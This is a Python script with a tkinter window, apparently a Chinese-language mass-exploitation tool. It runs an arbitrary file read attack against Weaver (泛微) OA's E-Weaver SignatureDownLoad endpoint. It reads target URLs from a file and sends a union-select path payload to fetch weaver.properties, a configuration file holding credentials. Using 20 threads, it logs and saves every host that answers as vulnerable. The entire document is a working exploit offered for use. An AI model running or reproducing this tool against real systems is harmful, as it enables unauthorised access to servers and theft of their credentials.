import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def E_Weaver_any_file_read_exp(url):
    poc = r"""/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "ecology.user" in res.text:
            E_Weaver_any_file_read_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            E_Weaver_any_file_read_text.see(END)
            with open ("存在泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            E_Weaver_any_file_read_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            E_Weaver_any_file_read_text.see(END)
    except Exception as err:
        E_Weaver_any_file_read_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        E_Weaver_any_file_read_text.see(END)
def get_E_Weaver_any_file_read_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def E_Weaver_any_file_read_gui():
    E_Weaver_any_file_read = tk.Tk()
    E_Weaver_any_file_read.geometry("910x450")
    E_Weaver_any_file_read.title("泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞一把梭")
    E_Weaver_any_file_read.resizable(0, 0)
    E_Weaver_any_file_read.iconbitmap('logo.ico')
    global E_Weaver_any_file_read_text
    E_Weaver_any_file_read_text = scrolledtext.ScrolledText(E_Weaver_any_file_read,width=123, height=25)
    E_Weaver_any_file_read_text.grid(row=0, column=0, padx=10, pady=10)
    E_Weaver_any_file_read_text.see(END)
    addrs = get_E_Weaver_any_file_read_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(E_Weaver_any_file_read_exp, addr)
    E_Weaver_any_file_read.mainloop()